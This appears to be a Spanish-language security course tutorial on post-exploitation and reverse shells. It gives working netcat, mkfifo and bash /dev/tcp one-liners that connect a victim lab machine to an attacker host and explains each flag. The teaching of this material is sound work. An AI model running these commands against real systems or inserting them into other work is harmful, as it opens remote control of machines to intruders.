# Acciones en la máquina explotada
Cuando un atacante logra vulnerar una máquina, su siguiente objetivo es, normalmente, obtener un acceso más profundo al sistema. Esto se logra comúnmente obteniendo una consola de comandos o shell, que permite al atacante ejecutar comandos directamente en el sistema afectado. La obtención de una shell es una etapa crucial en la cadena de ataque porque facilita una amplia gama de actividades maliciosas durante la intrusión y el proceso de post-explotación:
- Escalada de privilegios: Una vez dentro del sistema, el atacante buscará formas de obtener privilegios más elevados (root o administrador), lo que le permitiría tener control total sobre el sistema. Esto se puede lograr explotando vulnerabilidades del sistema, configuraciones inseguras, o abusando de políticas de permisos incorrectamente configuradas.
- Evasión de la detección: Los atacantes emplean técnicas para evitar ser detectados por el software de seguridad. Esto puede incluir la desactivación de antivirus y firewalls, o el uso de técnicas de living off the land, que aprovechan las herramientas y procesos legítimos del sistema para realizar acciones maliciosas sin ser detectados.
- Movimiento lateral: Una vez que se tiene control sobre un sistema, el atacante puede buscar acceder a otros sistemas en la misma red para expandir su control. Esto puede involucrar el robo de credenciales, el uso de vulnerabilidades en el software de otros sistemas, o el aprovechamiento de configuraciones de red inseguras.
- Exfiltración de datos: Los atacantes a menudo buscan robar datos sensibles del sistema comprometido. Esto puede incluir información personal, datos financieros, propiedad intelectual, o cualquier otro tipo de información que pueda ser de valor. Los datos pueden ser transferidos a servidores controlados por el atacante a través de la red.
- Implantación de malware: Con acceso al sistema, los atacantes pueden instalar diversos tipos de malware, incluyendo ransomware, troyanos, o keyloggers. Esto puede tener múltiples propósitos, desde el espionaje continuo hasta la monetización directa a través de ransomware o el robo de credenciales.
- Establecimiento de persistencia: Para mantener el acceso al sistema comprometido incluso después de reinicios o cambios de contraseña, los atacantes suelen establecer mecanismos de persistencia. Esto puede involucrar la creación de cuentas de usuario falsas, la modificación de archivos de inicio, o la explotación de servicios del sistema para ejecutar automáticamente malware.

## Obteniendo una shell reversa.
Una shell reversa es un tipo de shell o interfaz de línea de comandos que se utiliza para controlar sistemas remotos de forma encubierta. A diferencia de una shell tradicional, donde el atacante debe iniciar la conexión al sistema objetivo para enviar comandos, en una shell reversa es el sistema comprometido el que establece la conexión de vuelta hacia la máquina del atacante. Esto permite al atacante ejecutar comandos en el sistema comprometido como si estuviera sentado directamente frente a él, pero a través de una conexión de red.

El término "reversa" viene del hecho de que se invierte la dirección habitual de la conexión de red: en lugar de que el atacante se conecte al objetivo, es el objetivo el que se conecta al atacante. Esto tiene una ventaja táctica significativa, ya que muchas redes están configuradas para permitir salidas de conexiones hacia internet, pero bloquean conexiones entrantes no solicitadas como medida de seguridad. La shell reversa, por lo tanto, puede sortear estos controles al iniciar la conexión desde el interior de la red comprometida.

![Reverse Shell Attack with Netcat](https://miro.medium.com/v2/resize:fit:839/1*k5kQuDcgISOgpDNuD36MEQ.jpeg)
Fuente de la foto: https://blog.bugzero.io/reverse-shell-attack-with-netcat-c21f520deff9

El proceso para establecer una shell reversa generalmente involucra los siguientes pasos:
- Preparación: El atacante prepara un servidor o escucha en su sistema que pueda aceptar conexiones entrantes. Esto se hace usando herramientas específicas o escribiendo código que abra un puerto y espere conexiones.
- Ejecución de la carga útil: El sistema objetivo ejecuta una carga útil maliciosa (a menudo a través de un exploit o engaño) que está diseñada para abrir una shell reversa. Esta carga útil está configurada para conectarse a la dirección IP y puerto que el atacante ha preparado.
- Establecimiento de la conexión: Una vez ejecutada la carga útil, el sistema comprometido inicia una conexión de red hacia el atacante y establece una shell. A través de esta shell, el atacante puede enviar comandos al sistema comprometido.
- Control y comando: El atacante ahora tiene control sobre el sistema objetivo y puede ejecutar comandos de manera remota, realizar acciones maliciosas como las descritas anteriormente (escalada de privilegios, movimiento lateral, etc.).


El web https://www.revshells.com/ es una herramienta en línea que genera shell reversas. Permite a los usuarios configurar y obtener comandos para establecer shells reversas. Ofrece opciones para diferentes sistemas operativos y shells, incluyendo ajustes avanzados como el tipo de codificación.

### 1. Shell Reversas en Linux con netcat y bash
nc, abreviatura de Netcat, es una herramienta de red versátil conocida como el "navaja suiza" de la administración de redes. Permite leer y escribir datos a través de conexiones de red usando los protocolos TCP o UDP. Es ampliamente utilizada para la creación de conexiones de red entre hosts, ya sea para fines de diagnóstico, administración de redes, o como parte de técnicas de explotación o pruebas de seguridad. Netcat es capaz de abrir conexiones, escuchar puertos TCP o UDP, conectarlos, enviar datos sin procesar a través de las redes, y crear túneles. Es altamente valorado por su simplicidad y efectividad en tareas como la transferencia de archivos, la creación de backdoors, o como cliente y servidor para pruebas de red. 

**Otras herramientas más modernas como:**
- ncat: Ncat es una herramienta de red mejorada y más segura que es parte del proyecto Nmap. Ofrece funcionalidades similares a Netcat, pero con características adicionales como el cifrado SSL para conexiones seguras, autenticación fácil, y la capacidad de manejar simultáneamente múltiples conexiones. Ncat es versátil para la depuración de redes, exploración, y como un componente en scripts de pruebas de seguridad. Su diseño moderno y las mejoras de seguridad lo hacen una elección preferente para profesionales de la seguridad informática.
- Socat: Es una herramienta de línea de comandos que permite el establecimiento de dos flujos de datos bidireccionales. Es similar a Netcat pero más complejo y potente, ofreciendo características como la creación de túneles seguros, la transferencia de datos entre diferentes protocolos (por ejemplo, TCP, UDP, UNIX sockets), y la posibilidad de ejecutar scripts o comandos a través de su conexión. Socat es ampliamente utilizado por administradores de sistemas y profesionales de seguridad para diagnósticos de red, pruebas, y como un potente instrumento para diversas tareas de red.

#### Ejemplo con netcat
Para obtner la shell reversa, usaremos netcat tanto en el atacante (kali) como en la víctima (ubuntu):
- En la máquina atacante (Kali), iniciamos Netcat en modo escucha especificando un puerto:
  ```
  nc -lnvp 9000
  ```
  l: arranca netcat en modo escucha (listen mode).
  n: indica que se utilice el modo numérico (evita la resolución de nombres DNS, lo que acelera el proceso).
  v: establece el modo verbose, lo que permite ver quién se conecta al servidor.
  p: para indicar el puerto.

- En la máquina objetivo (Ubuntu), usamos Netcat para conectarte a la dirección IP de la máquina atacante y el puerto especificado, redireccionando la shell a esta conexión.
  ```
  nc [IP del atacante] [puerto] -e /bin/sh
  ```
  e: para ejecutar una shell reversa. También podríamos usar la opcioin -c. Sin embargo la opcion -e ó -c no estan disponibles en la version tradicional de netcat, sino que pertenecen a ncat. Por tanto, al usarlas devolverá un error.

  En su lugar hay que emplear los ficheros FIFO o named pipe, que son un tipo especial de fichero en linux, que permite enviar datos entre procesos, muy similar a las tuberías o pipes. Para crear un fichero FIFO se emplea el comando mkfifo ➡
  ```
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1| nc 192.168.1.103 9000 > /tmp/f
  ```
  Este comando crea un canal de comunicación bidireccional entre la máquina víctima y la atacante, usando un archivo FIFO en /tmp/f. Primero, elimina /tmp/f si existe y luego crea un FIFO con mkfifo. Utiliza cat para leer este FIFO y pasa la salida a sh -i, creando una shell interactiva que redirige tanto la entrada estándar como la salida estándar y el error estándar a través de Netcat hacia la dirección IP 192.168.1.103 en el puerto 9000. Finalmente, la salida de Netcat se redirige de nuevo al FIFO, completando el circuito para la comunicación bidireccional. Los datos circulan a través de la conexión con la máquina atacante en la ip 192.168.1.103 y el puerto 9000, y la máquina vulnerable por medio del fichero FIFO.

- Tras ejecutar este comando se obtiene una shell reverse en la máquina atacante. Se establece la conexión, podemos ejecutar comandos en la máquina objetivo desde la máquina atacante.

Recomendación: Ver Exploring mkfifo / nc Reverse Shell ➡ https://www.youtube.com/watch?v=_q_ZCy-hEqg


#### Ejemplo con bash
Usaremos bash en la máquina víctima para obtener la shell reversa:
- En la máquina atacante se utilizará necat en modo escucha, igual que en el punto anterior:
  ```
  nc -lnvp 9000
  ```
- En la máquina víctima usaremos bash para obtener la shell reversa:
  ```
  bash -i >& /dev/tcp/[IP_DEL_ATACANTE]/[PUERTO] 0>&1
  bash -i >& /dev/tcp/192.168.1.103/9000 0>&1
  ```
  Este comando inicia una shell Bash interactiva (bash -i) y redirige su salida (>&) al dispositivo /dev/tcp/192.168.1.103/9000, que representa una conexión TCP al host con IP 192.168.1.103 en el puerto 9000. Luego, 0>&1 redirige la entrada estándar (stdin, file descriptor 0) a la salida estándar (stdout, file descriptor 1), permitiendo la comunicación bidireccional a través de la red. Esto efectivamente crea una shell reversa, permitiendo que el host remoto ejecute comandos en la máquina víctima. También se puede usar udp en lugar de tcp.
  ![](capturas/shell-reversa-bash-mv-victima.png)
- Si ejecutamos comandos en la máquina atacante, obtenemos la shell reversa.
  ![](capturas/shell-reversa-bash-mv-atacante.png)

Recomendación: Ver Exploring bash Reverse Shell ➡ https://www.youtube.com/watch?v=OjkVep2EIlw
